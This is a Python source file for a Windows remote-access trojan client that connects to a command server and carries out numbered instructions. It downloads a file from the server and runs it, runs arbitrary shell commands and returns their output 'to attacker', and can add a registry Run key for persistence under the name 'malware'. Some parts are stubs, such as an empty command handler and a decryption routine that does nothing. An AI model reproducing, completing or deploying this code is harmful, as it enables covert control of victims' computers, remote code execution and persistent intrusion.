import socket
import subprocess
import os
import select
import sys
import winreg

SERVER_IP = '127.0.0.1'
SERVER_PORT = 2005
KEY_ENTER = 13
KEY_BACKSPACE = 8
PORT_INDEX = 1
SOCKET_RECV_BYTES = 1024

main_socket = None


def receive_file(params, file="update.py"):
    size_to_read = int(params[0])
    print 'file size = ', size_to_read
    with open(file, 'wb') as f:
        print 'file opened'
        while size_to_read > 0:
            print('receiving data...')
            data = main_socket.recv(SOCKET_RECV_BYTES)
            print 'data=', data
            # write data to a file
            f.write(data)
            size_to_read -= len(data)

        print "done"


def run():
    # subprocess.call("python update.py")
    os.system('python update.py')


def terminate(params):
    print "realpath:", os.path.realpath(__file__)
    # os.remove(os.path.realpath(__file__))  # TODO: add it
    print 'exit!'
    sys.exit()
    print 'exit??'


def handle_cmd_command(command):
    if command.split()[0] == "cd":
        if len(command.split()) == 1:
            main_socket.send((os.getcwd()))
        elif len(command.split()) == 2:
            try:
                os.chdir(command.split()[1])
                main_socket.send(("Changed directory to " + os.getcwd()))
            except WindowsError:
                main_socket.send(str.encode("No such directory : " + os.getcwd()))

    else:
        # do shell command
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE)
        # read output
        stdout_value = proc.stdout.read() + proc.stderr.read()
        print(stdout_value + "\n")
        # send output to attacker
        if stdout_value != "":
            main_socket.send(stdout_value)
        else:
            main_socket.send(command + " does not return anything")


def cmd(params):
    pass


def update_version(params):
    receive_file(params)
    run()


def get_command_id(my_string_msg):
    return int(my_string_msg.split(';')[0])


def get_command_params(my_string_msg):
    return my_string_msg.split(';')[1:]


action_dict = {
    0: terminate,
    2: cmd,
    4: update_version
}


def action_to_preform(message):
    action_code = get_command_id(message)
    # action_code = int(message)
    params = get_command_params(message)
    return action_dict[action_code](params)


def decryption(message):
    return message


def manipulate_data(encrypt_message):
    try:
        decrypt_message = decryption(encrypt_message)
        return action_to_preform(decrypt_message)
    except Exception as e:
        print 'Manipulate data exception:', e


def set_run_key(key, value):
    """
    Set/Remove Run Key in windows registry.

    :param key: Run Key Name
    :param value: Program to Run
    :return: None
    """
    # This is for the system run variable
    reg_key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r'Software\Microsoft\Windows\CurrentVersion\Run',
        0, winreg.KEY_SET_VALUE)

    with reg_key:
        if value is None:
            winreg.DeleteValue(reg_key, key)
        else:
            if '%' in value:
                var_type = winreg.REG_EXPAND_SZ
            else:
                var_type = winreg.REG_SZ
            winreg.SetValueEx(reg_key, key, 0, var_type, value)


def main():
    try:
        global main_socket
        main_socket = socket.socket()
        main_socket.connect((SERVER_IP, SERVER_PORT))
        socket_messages = []
        print 'Victim is connected to ({}) with port {}'.format(SERVER_IP, main_socket.getsockname()[PORT_INDEX])

        # persistence - add to the registry
        # set_run_key('malware',__file__)

        # I'm up
        # my_socket.send("0")
        # print(my_socket.recv(SOCKET_RECV_BYTES))

        while True:
            rlist, wlist, xlist = select.select([main_socket] + socket_messages, [main_socket] + socket_messages, [])
            for sock in rlist:
                if sock is main_socket:
                    msg = main_socket.recv(SOCKET_RECV_BYTES)
                    if not msg and msg == '':
                        sock.close()
                        print 'Connection with server was closed'
                        return
                    else:
                        print msg
                        manipulate_data(msg)

    except Exception as e:
        print 'Exception occurred, value:', e
    finally:
        main_socket.close()
        print 'client connection is closed'


if __name__ == "__main__":
    main()
